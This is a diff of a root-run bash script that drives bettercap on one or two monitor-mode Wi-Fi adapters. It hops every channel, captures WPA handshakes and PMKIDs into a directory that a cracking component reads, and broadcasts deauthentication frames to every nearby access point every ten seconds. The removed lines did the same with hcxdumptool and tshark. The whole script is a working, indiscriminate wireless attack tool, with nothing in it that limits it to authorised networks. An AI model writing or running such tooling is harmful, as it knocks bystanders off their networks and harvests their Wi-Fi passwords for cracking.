@@ -1,52 +1,52 @@
 #!/bin/bash
 #
 # Scout orchestrator (Fennec harvester module). Runs as root via fennec-scout.service.
-# Drives one or two monitor-mode adapters with hcxdumptool to harvest WPA PMKIDs
-# and 4-way handshakes, then splits the capture into one pcap per network where
-# Sly already reads them, so cracking needs no change.
+# Scout is a wide Wi-Fi harvester built on bettercap (the same engine Pwnagotchi
+# uses), so capture and deauth run together on a single adapter:
+#   - channel hopping across every supported frequency (wifi.recon)
+#   - 4-way handshake + clientless PMKID capture, written to the handshakes dir
+#     Sly already reads (pwnagotchi naming), so cracking needs no change
+#   - continuous deauth of every AP (ticker -> wifi.deauth ff:ff:ff:ff:ff:ff),
+#     forcing reconnections automatically, no interaction needed
+# With two adapters a second bettercap runs on the second card for extra coverage.
 #
 # Config is read from /tmp/fennec-scout/config.json (written by scout_engine.py):
-#   mode     : "wide" — sweep all frequencies, continuous deauth + PMKID/handshake capture
 #   adapters : list of monitor-capable interfaces to use (1 or 2)
 #
-# Stats for the launcher are written to /tmp/fennec-scout/stats.json.
-#
-# NOTE (verify on the Pi): the exact hcxdumptool flags depend on its version
-# (Trixie ships v6.x). The invocations below use the v6 syntax; adjust -c / the
-# deauth and filter flags here if the installed version differs.
+# Live stats are produced by fennec-scout-poll (reads bettercap's REST API) and
+# written to /tmp/fennec-scout/stats.json.
 set -u
 
 RUN_DIR=/tmp/fennec-scout
 CONFIG="$RUN_DIR/config.json"
 STATS="$RUN_DIR/stats.json"
-PCAP="$RUN_DIR/scout.pcapng"
-PCAP5="$RUN_DIR/scout-5g.pcapng"
 HANDSHAKES=/etc/pwnagotchi/handshakes
+CAPLET=/etc/pwnagotchi/pwnagotchi-auto.cap
+POLL=/usr/local/bin/fennec-scout-poll
 
-# EU channel plan. One adapter sweeps everything; two split the bands.
-BAND24="1,2,3,4,5,6,7,8,9,10,11,12,13"
-BAND5="36,40,44,48,149,153,157,161,165"
-BANDALL="$BAND24,$BAND5"
-
-mkdir -p "$RUN_DIR"
+mkdir -p "$RUN_DIR" "$HANDSHAKES"
 chmod 755 "$RUN_DIR"
-rm -f "$PCAP" "$PCAP5" "$RUN_DIR/merged.pcapng"
-mkdir -p "$HANDSHAKES"
+rm -f "$STATS" "$RUN_DIR/run.log"
 
 [ -f "$CONFIG" ] || { echo "no config"; exit 1; }
-
-MODE=$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1])).get("mode","wide"))' "$CONFIG" 2>/dev/null)
 IFACES=$(python3 -c 'import json,sys;print(" ".join(json.load(open(sys.argv[1])).get("adapters") or []))' "$CONFIG" 2>/dev/null)
-
 [ -n "$IFACES" ] || { echo "no adapters"; exit 1; }
 set -- $IFACES
 IFACE1="$1"
 IFACE2="${2:-}"
 
+pids=()
+cleanup() {
+    kill "${pids[@]}" 2>/dev/null
+    pkill -f "bettercap .*-iface $IFACE1" 2>/dev/null
+    [ -n "$IFACE2" ] && pkill -f "bettercap .*-iface $IFACE2" 2>/dev/null
+    exit 0
+}
+trap cleanup TERM INT
+
 monitor_up() {
     local i="$1"
-    # NetworkManager grabbing the adapter back is the usual reason capture dies:
-    # hand the interface over before switching it to monitor.
+    # Hand the interface over from NetworkManager before switching to monitor.
     nmcli dev set "$i" managed no 2>/dev/null || true
     rfkill unblock wifi 2>/dev/null || true
     ip link set "$i" down 2>/dev/null || true
@@ -55,161 +55,42 @@ monitor_up() {
     iw dev "$i" info >> "$RUN_DIR/run.log" 2>&1 || true
 }
 
-pids=()
-cleanup() {
-    kill "${pids[@]}" 2>/dev/null
-    pkill -f "hcxdumptool.*fennec-scout" 2>/dev/null
-    exit 0
-}
-trap cleanup TERM INT
-
-{ echo "=== scout start $(date) mode=$MODE ifaces=$IFACES ==="
-  echo -n "hcxdumptool: "; hcxdumptool --version 2>&1 | head -1
-} >> "$RUN_DIR/run.log" 2>&1
-
 monitor_up "$IFACE1"
 [ -n "$IFACE2" ] && monitor_up "$IFACE2"
 
-# Write the initial stats so the UI shows "running" immediately.
-python3 - "$STATS" "$MODE" "$IFACE1" "$IFACE2" <<'PY' 2>/dev/null
+echo "=== scout start $(date) ifaces=$IFACES ===" >> "$RUN_DIR/run.log"
+
+# Initial stats so the UI shows "running" immediately.
+python3 - "$STATS" <<'PY' 2>/dev/null
 import json, sys
-json.dump({"mode": sys.argv[2], "status": "running",
-           "handshakes": 0, "pmkid": 0, "aps": 0, "recent": []},
+json.dump({"mode": "wide", "status": "running", "handshakes": 0,
+           "pmkid": 0, "aps": 0, "deauth": 0, "recent": []},
           open(sys.argv[1], "w"))
 PY
 chmod 644 "$STATS" 2>/dev/null
 
-hcx_capture() {   # $1 interface, $2 output pcapng
-    # Capture only (no injection): sweep every supported frequency, harvest PMKIDs
-    # and record any 4-way handshake. hcxdumptool's own deauth injection is broken
-    # on these drivers (exit-on-error), so deauth is driven separately by aireplay.
-    hcxdumptool -i "$1" -w "$2" -F --disable_deauthentication >> "$RUN_DIR/run.log" 2>&1 &
-    pids+=($!)
-}
+# bettercap eval: capture handshakes + PMKID to Sly's dir, hop all channels, and
+# deauth every AP every 10 s.
+EVAL="set wifi.handshakes.aggregate false;"
+EVAL="$EVAL set wifi.handshakes.file $HANDSHAKES;"
+EVAL="$EVAL set wifi.deauth.silent true; set wifi.deauth.open true;"
+EVAL="$EVAL wifi.recon on;"
+EVAL="$EVAL set ticker.period 10; set ticker.commands \"wifi.deauth ff:ff:ff:ff:ff:ff\"; ticker on"
 
+# Card 1 carries the REST API (via the caplet) that the poller reads for stats.
+bettercap -no-colors -caplet "$CAPLET" -iface "$IFACE1" -eval "$EVAL" \
+    >> "$RUN_DIR/run.log" 2>&1 &
+pids+=($!)
+
+# Card 2 (if present): extra coverage + deauth, no API.
 if [ -n "$IFACE2" ]; then
-    # Two adapters: both sweep in parallel; their captures are merged below.
-    hcx_capture "$IFACE1" "$PCAP"
-    hcx_capture "$IFACE2" "$PCAP5"
-else
-    hcx_capture "$IFACE1" "$PCAP"
+    bettercap -no-colors -iface "$IFACE2" -eval "$EVAL" \
+        >> "$RUN_DIR/run.log" 2>&1 &
+    pids+=($!)
 fi
 
-sanitize() { echo "$1" | tr -c 'A-Za-z0-9._-' '_' | cut -c1-32 | sed 's/^_*//; s/_*$//'; }
+# Stats poller (bettercap API + handshakes dir -> stats.json).
+python3 "$POLL" >> "$RUN_DIR/run.log" 2>&1 &
+pids+=($!)
 
-# tshark returns wlan.ssid as hex bytes; decode to the real text ESSID. When the
-# field carries several occurrences (comma separated), keep the first.
-decode_ssid() {
-    local s="${1%%,*}"
-    if [ -n "$s" ] && [ $(( ${#s} % 2 )) -eq 0 ] && [[ "$s" =~ ^[0-9a-fA-F]+$ ]]; then
-        printf '%b' "$(echo "$s" | sed 's/../\\x&/g')" 2>/dev/null
-    else
-        printf '%s' "$s"
-    fi
-}
-
-# Split the rolling capture into one pcap per network for Sly, and refresh stats.
-while true; do
-    sleep 10
-    [ -s "$PCAP" ] || [ -s "$PCAP5" ] || continue
-    # With two adapters each writes its own band; merge them so both are analysed.
-    SRC="$PCAP"
-    if [ -s "$PCAP5" ]; then
-        if mergecap -w "$RUN_DIR/merged.pcapng" "$PCAP" "$PCAP5" 2>/dev/null; then
-            SRC="$RUN_DIR/merged.pcapng"
-        fi
-    fi
-
-    # Counters are derived from what the list actually finds (below), not from
-    # hcxpcapngtool's whole-file totals, which over-count duplicate EAPOL pairs.
-    hs=0; pmkid=0; aps=0
-
-    recent="[]"
-    if command -v tshark >/dev/null; then
-        declare -A RANK STATUS BSS
-        # One line per network NAME (not per BSSID), keeping the best status seen:
-        # HS (3) > PMKID (2) > seen (1). Nameless networks (hidden/empty) are kept
-        # for Sly but never shown in the list.
-        set_status() {   # name type rank bssid
-            local cur=${RANK[$1]:-0}
-            if [ "$3" -gt "$cur" ]; then STATUS[$1]="$2"; RANK[$1]="$3"; BSS[$1]="$4"; fi
-        }
-        clean_name() {   # raw-essid -> clean name, or "" when there is none
-            local n; n=$(sanitize "$(decode_ssid "$1")")
-            case "$n" in ""|hidden|Hidden|MISSING|missing|unknown) n="";; esac
-            echo "$n" | grep -qE '[A-Za-z0-9]' || n=""
-            # Reject leftover undecoded hex blobs (no real SSID is a long hex string).
-            echo "$n" | grep -qiE '^[0-9a-f]{12,}$' && n=""
-            printf '%s' "$n"
-        }
-
-        # 1) Networks with a real capture: split, keep for Sly if a 4-way or PMKID
-        #    is present. Bare EAPOL frames are discarded.
-        for b in $(tshark -r "$SRC" -Y "eapol" -T fields -e wlan.bssid 2>/dev/null | tr 'A-F' 'a-f' | sort -u | grep -E '^[0-9a-f:]{17}$'); do
-            hex=$(echo "$b" | tr -d ':')
-            essid=$(tshark -r "$SRC" -Y "wlan.fc.type_subtype==0x08 && wlan.bssid==$b" \
-                    -T fields -e wlan.ssid 2>/dev/null | grep -v '^$' | head -1)
-            name=$(clean_name "$essid")
-            tmp="$RUN_DIR/split.pcap"
-            tshark -r "$SRC" -Y "wlan.bssid==$b" -w "$tmp" 2>/dev/null || continue
-            type=""
-            if command -v hcxpcapngtool >/dev/null; then
-                sum=$(hcxpcapngtool "$tmp" 2>/dev/null)
-                hsn=$(echo "$sum" | grep -iE "EAPOL pairs" | grep -oE '[0-9]+' | head -1)
-                pmn=$(echo "$sum" | grep -iE "PMKID"       | grep -oE '[0-9]+' | head -1)
-                if [ "${hsn:-0}" -gt 0 ]; then type="HS"
-                elif [ "${pmn:-0}" -gt 0 ]; then type="PMKID"; fi
-            fi
-            if [ -z "$type" ]; then rm -f "$tmp"; continue; fi
-            out="$HANDSHAKES/${name:-hidden}_${hex}.pcap"
-            mv -f "$tmp" "$out" 2>/dev/null && chmod 644 "$out" 2>/dev/null
-            [ -n "$name" ] || continue
-            if [ "$type" = "HS" ]; then set_status "$name" HS 3 "$b"
-            else set_status "$name" PMKID 2 "$b"; fi
-        done
-
-        # 2) Every named AP seen (beacons) that has no capture yet -> "seen".
-        while IFS=$'\t' read -r bs ss; do
-            b=$(echo "$bs" | tr 'A-F' 'a-f')
-            [[ "$b" =~ ^[0-9a-f:]{17}$ ]] || continue
-            name=$(clean_name "$ss"); [ -n "$name" ] || continue
-            set_status "$name" seen 1 "$b"
-        done < <(tshark -r "$SRC" -Y "wlan.fc.type_subtype==0x08" -T fields -e wlan.bssid -e wlan.ssid 2>/dev/null | awk '!s[$1]++')
-
-        # APs seen = distinct named networks, so it matches the list below.
-        aps=${#STATUS[@]}
-
-        # 3) Build the list, best status first, capped for readability.
-        items=""; n=0
-        for want in HS PMKID seen; do
-            for name in "${!STATUS[@]}"; do
-                [ "${STATUS[$name]}" = "$want" ] || continue
-                [ $n -ge 40 ] && break
-                items="$items${items:+,}{\"name\":\"${name}\",\"bssid\":\"${BSS[$name]}\",\"type\":\"${STATUS[$name]}\"}"
-                n=$((n+1))
-                [ "$want" = "HS" ] && hs=$((hs+1))
-                [ "$want" = "PMKID" ] && pmkid=$((pmkid+1))
-            done
-        done
-        [ -n "$items" ] && recent="[$items]"
-        unset RANK STATUS BSS
-
-        # Deauth / disassoc frames in flight — proof the attack is running.
-        deauth=$(tshark -r "$SRC" -Y "wlan.fc.type_subtype==0x0c || wlan.fc.type_subtype==0x0a" 2>/dev/null | wc -l)
-    fi
-    deauth=${deauth:-0}
-
-    python3 - "$STATS" "$MODE" "$hs" "$pmkid" "$aps" "$recent" "$deauth" <<'PY' 2>/dev/null
-import json, sys
-try:
-    recent = json.loads(sys.argv[6])
-except Exception:
-    recent = []
-json.dump({"mode": sys.argv[2], "status": "running",
-           "handshakes": int(sys.argv[3]), "pmkid": int(sys.argv[4]),
-           "aps": int(sys.argv[5]), "recent": recent[:20],
-           "deauth": int(sys.argv[7])},
-          open(sys.argv[1], "w"))
-PY
-    chmod 644 "$STATS" 2>/dev/null
-done
+wait
